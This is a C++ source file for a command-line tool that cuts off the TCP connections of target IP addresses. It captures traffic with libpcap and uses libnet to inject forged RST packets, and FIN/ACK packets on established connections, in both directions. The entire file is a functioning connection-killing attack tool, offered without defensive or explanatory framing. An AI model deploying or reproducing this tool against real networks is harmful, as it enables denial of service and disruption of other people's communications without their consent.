#include "Logging.hh"

#include <list>
#include <set>
#include <string>

#include <cassert>
#include <cstdio>
#include <cstring>
#include <arpa/inet.h>
#include <getopt.h>

#include <pcap.h>
#include <libnet.h>

using std::list;
using std::set;
using std::string;

bool operator <(in_addr a, in_addr b)
{
    return a.s_addr < b.s_addr;
}

struct LoopUserData
{
    pcap_t *pcap;
    libnet_t *libnet;
};

char libnet_errbuf[LIBNET_ERRBUF_SIZE];
char pcap_errbuf[PCAP_ERRBUF_SIZE];

const option sGetoptLongOptions[] =
{
    { "interface", true, 0, 'i' },    

    { 0, false, 0, 0 }
};

const char *sGetoptOptions = "-i:";

static void usage(const char *argv0)
{
    printf("Usage:\n");
    printf("\t%s [-i interface] <ip> ... \n", argv0);
    printf("\n");
    printf("Hatches <ip>s on <interface>, or the interface of the default\n");
    printf("route if none is specified.\n");
}

static void PacketHandler(u_char *user, const struct pcap_pkthdr *h,
                          const u_char *bytes);

int main(int argc, char **argv)
{
    list<const char *> targets;
    const char *interface = NULL;

    // Argument handling
    int param;
    while ((param = getopt_long(argc, argv, sGetoptOptions, sGetoptLongOptions, 0)) >= 0)
    {
        switch (param)
        {
        case 1:
            // Add target
            targets.push_back(optarg);
            break;

        case 'i':
            // Set interface
            interface = optarg;
            break;
        }
    }

    if (targets.empty())
    {
        usage(argv[0]);
        return 1;
    }

    // Validate the target addresses and construct BPF filter
    string bpfSource("tcp and (");
    for (list<const char *>::iterator iter = targets.begin();
         iter != targets.end(); iter++)
    {
        in_addr dummy;
        int error = inet_pton(AF_INET, *iter, &dummy);
        if (error == 0)
        {
            ERROR("Error parsing target address '%s'", *iter);
        }

        if (iter != targets.begin())
        {
            bpfSource += " or ";
        }
        bpfSource += "ip host ";
        bpfSource += *iter;
    }
    bpfSource += ")";

    // Look up default route if necessary
    if (!interface)
    {
        WARN("Falling back to eth0 since I don't know routing tables yet.");
        interface = "eth0";
    }

    // Open packet capture on the interface
    pcap_t *pcap = pcap_open_live(interface, 65536, true, 0, pcap_errbuf);
    if (!pcap)
    {
        ERROR("Error opening interface for capture: %s", pcap_errbuf);
    }

    // Compile and set packet filter
    bpf_program bpfProgram;
    int error = pcap_compile(pcap, &bpfProgram, bpfSource.c_str(), true, 0);
    if (error < 0)
    {
        ERROR("Error compiling generated filter ('%s'): %s", bpfSource.c_str(), pcap_errbuf);
    }
    error = pcap_setfilter(pcap, &bpfProgram);
    if (error < 0)
    {
        ERROR("Error setting compiled filter: %s", pcap_errbuf);
    }

    // Open packet injection on the interface
    libnet_t *libnet = libnet_init(LIBNET_RAW4, (char *)interface, libnet_errbuf);
    if (!libnet)
    {
        ERROR("Error opening interface for injection: %s", libnet_errbuf);
    }

    // Enter packet loop
    LoopUserData userData = { pcap, libnet };
    error = pcap_loop(pcap, -1, PacketHandler, (u_char *)&userData);
    if (error < 0)
    {
        ERROR("PCAP loop returned error: %s", pcap_errbuf);
    }

    return 0;
}

static void InjectTCP(libnet_t *libnet,
                      libnet_ipv4_hdr *ipv4,
                      libnet_tcp_hdr *tcp,
                      bool backward,
                      uint8_t flags)
{
    libnet_build_tcp(backward ? ntohs(tcp->th_dport) : ntohs(tcp->th_sport),
                     backward ? ntohs(tcp->th_sport) : ntohs(tcp->th_dport),
                     backward ? ntohl(tcp->th_ack) : ntohl(tcp->th_seq),
                     backward ? ntohl(tcp->th_seq) : ntohl(tcp->th_ack),
                     flags,
                     ntohs(tcp->th_win),
                     0, // Auto-fill checksum
                     0,
                     LIBNET_TCP_H,
                     0, // payload
                     0, // payload size
                     libnet,
                     0);
    libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H,
                      ipv4->ip_tos,
                      ntohs(ipv4->ip_id),
                      0,
                      ipv4->ip_ttl,
                      ipv4->ip_p,
                      0, // Auto-fill checksum
                      backward ? ipv4->ip_dst.s_addr : ipv4->ip_src.s_addr,
                      backward ? ipv4->ip_src.s_addr : ipv4->ip_dst.s_addr,
                      0, // payload
                      0, // payload size
                      libnet,
                      0);
    int error = libnet_write(libnet);
    if (error < 0)
    {
        ERROR("Error injecting packet: %d, %s", error, libnet_errbuf);
    }
    libnet_clear_packet(libnet);

}
static void InjectRSTs(libnet_t *libnet,
                       libnet_ipv4_hdr *ipv4,
                       libnet_tcp_hdr *tcp)
{
    InjectTCP(libnet, ipv4, tcp, false, TH_RST);
    InjectTCP(libnet, ipv4, tcp, true, TH_RST);
}

#ifndef DUMB_AS_NAILS
static void InjectFINs(libnet_t *libnet,
                       libnet_ipv4_hdr *ipv4,
                       libnet_tcp_hdr *tcp)
{
    InjectTCP(libnet, ipv4, tcp, false, TH_FIN | TH_ACK);
    InjectTCP(libnet, ipv4, tcp, true, TH_FIN | TH_ACK);
}
#endif

static void PacketHandler(u_char *cuser, const struct pcap_pkthdr *h,
                          const u_char *bytes)
{
    LoopUserData *user = (LoopUserData *)cuser;

    if (h->caplen < LIBNET_ETH_H + LIBNET_IPV4_H + LIBNET_TCP_H)
    {
        // Packet chunk too small to contain TCP
        return;
    }

    libnet_ipv4_hdr *ipv4 = (libnet_ipv4_hdr *)(bytes + LIBNET_ETH_H);
    libnet_tcp_hdr *tcp = (libnet_tcp_hdr *)(bytes + LIBNET_ETH_H + ipv4->ip_hl * sizeof(uint32_t));

#ifndef DUMB_AS_NAILS
    if (tcp->th_flags & TH_SYN)
    {
        printf("New connection, sending RSTs.\n");
        InjectRSTs(user->libnet, ipv4, tcp);
    }
    else if (!(tcp->th_flags & TH_FIN) && !(tcp->th_flags & TH_RST))
    {
        printf("Old connection, sending FINs.\n");
        InjectFINs(user->libnet, ipv4, tcp);
    }
#else
    if (!(tcp->th_flags & TH_RST))
    {
        printf("Packet, sending RSTs.\n");
        InjectRSTs(user->libnet, ipv4, tcp);
    }
#endif
}
